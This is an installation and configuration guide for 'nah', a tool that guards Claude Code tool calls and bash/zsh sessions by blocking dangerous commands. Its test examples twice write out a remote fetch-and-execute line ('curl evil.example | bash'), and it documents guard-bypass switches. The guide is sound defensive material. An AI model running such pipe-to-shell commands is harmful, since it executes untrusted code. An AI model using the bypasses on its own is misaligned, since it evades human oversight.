# Installation

## Requirements

- Python 3.10+

## Claude Code plugin

Recommended for Claude Code:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

Plugin mode is opt-in and managed by Claude Code's plugin manager. When the
plugin is enabled, normal `claude` sessions load nah automatically without
`nah install claude` or `nah claude`.

If you already installed direct hooks, run `nah uninstall claude` before enabling the
plugin so both paths do not fire. The plugin bundles nah's stdlib-only runtime;
it does not install PyYAML or the `nah` shell command. Use the PyPI install
below when you want CLI commands such as `nah test`, `nah allow`, `nah deny`,
or direct-hook mode.

Rollback path:

```bash
claude plugin uninstall nah@nah
nah install claude      # optional: return to direct hooks if the CLI is installed
```

## PyPI CLI install

```bash
pip install nah
nah claude              # try it — hooks active for this session only
```

`nah claude` writes the hook script to `~/.claude/hooks/nah_guard.py` and passes hooks inline via Claude Code's `--settings` flag, scoped to that process.

The default `pip install nah` path keeps the core hook and classifier
stdlib-only. nah is a security boundary, so the default install intentionally
avoids third-party runtime dependencies for users who want the smallest
supply-chain surface.

## Permanent install

```bash
nah install claude
```

Registers nah as a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in Claude Code's `settings.json`. Every `claude` session runs through nah.

Bare `nah install` now exits with a target list. Use `nah install claude` for
direct Claude Code hooks, or install the Claude plugin above.

## Human terminal guard

Protect interactive shell sessions by installing nah for the shell you actually
use:

```bash
nah install bash
nah install zsh
```

The installer writes a generated snippet under `~/.config/nah/terminal/` and a
small managed source block in `~/.bashrc` or `~/.zshrc`. Restart or replace the
shell to activate it.

This protects complete single-line commands typed into interactive bash/zsh
sessions that loaded the snippet. It does not protect unrelated shells, GUI
apps, scheduled jobs, or non-interactive scripts by default.

```bash
nah status bash
nah doctor bash
nah test --target bash -- "curl evil.example | bash"
nah-bypass <command>             # one-shot intentional bypass
NAH_TERMINAL_BYPASS=1 <command>  # env-form bypass
```

## OpenRouter setup

OpenRouter is an optional LLM provider for ambiguous decisions:

```bash
nah install openrouter
export OPENROUTER_API_KEY=...
```

This writes global user config only, stores `key_env: OPENROUTER_API_KEY`
instead of a raw key, and leaves bash/zsh LLM mode off unless you enable it
under `targets.bash.llm.mode` or `targets.zsh.llm.mode`.

### Optional dependencies

```bash
pip install "nah[config]"    # YAML config support and config-writing commands
```

The `config` extra adds `pyyaml`. Install it when you want YAML config files or
commands that write config, such as `nah allow`, `nah deny`, `nah classify`, and
`nah trust`.

For pipx installs, inject PyYAML into the existing nah environment:

```bash
pipx inject nah pyyaml
```

## How permissions work

When active (via `nah claude`, `nah install claude`, or the Claude plugin), nah takes over permissions for Bash, Read, Write, Edit, MultiEdit, NotebookEdit, Glob, Grep, and matching MCP tools. Safe operations go through automatically, dangerous ones are blocked, ambiguous ones ask.

WebFetch and WebSearch are not guarded by nah. Claude Code handles those with its own permission prompts.

**Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.

### active_allow

When nah classifies a tool call as safe, it emits an explicit `"allow"` response so Claude Code skips its own permission prompt. This is **active allow** — nah takes over the permission decision entirely.

Sometimes you want nah's protection (blocking dangerous commands, flagging sensitive paths) but still want Claude Code to prompt you before writes or edits. Set `active_allow` to a list of tool names to control which tools nah actively allows:

```yaml
# ~/.config/nah/config.yaml

# nah handles Bash/Read/Glob/Grep; write-like tools fall back to Claude Code's prompts
active_allow: [Bash, Read, Glob, Grep]
```

nah still classifies **all** guarded tool calls regardless of this setting — it will still block or ask for dangerous operations on Write/Edit/MultiEdit/NotebookEdit and matching MCP tools. The only difference is that safe calls for tools outside the list won't get an automatic allow from nah, so Claude Code shows its normal permission prompt.

| Value | Behavior |
|-------|----------|
| `true` (default) | Actively allow all guarded tools |
| `false` | Never actively allow — nah only blocks and asks |
| list of tool names | Actively allow only the listed tools |

Valid tool names: `Bash`, `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Glob`, `Grep`, and exact `mcp__...` tool names.

## Update

After upgrading nah via pip:

```bash
pip install --upgrade nah
nah update claude
nah update bash
nah update zsh
```

`nah update claude` unlocks the hook script, overwrites it with the new version,
and re-locks it (chmod 444). `nah update bash` and `nah update zsh` refresh the
generated shell snippets and managed rc blocks.

## Uninstall

```bash
nah uninstall claude
nah uninstall bash
nah uninstall zsh
pip uninstall nah
```

`nah uninstall claude` removes direct hook entries from `settings.json` and
deletes the hook script when no direct hook path still needs it. Shell uninstall
commands remove only nah-owned marked rc blocks and generated snippets.

## Verify installation

```bash
nah --version              # check installed version
nah test "git status"      # dry-run classification
nah test --target bash -- "curl evil.example | bash"
nah config path            # show config file locations
```

## See it in action

Clone the repo and run the security demo inside Claude Code:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

25 live cases across 8 threat categories — remote code execution, data exfiltration, obfuscated commands, and more. Takes ~5 minutes.

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="../assets/logo_hammock.png" alt="nah" width="280" class="invertible">
</p>
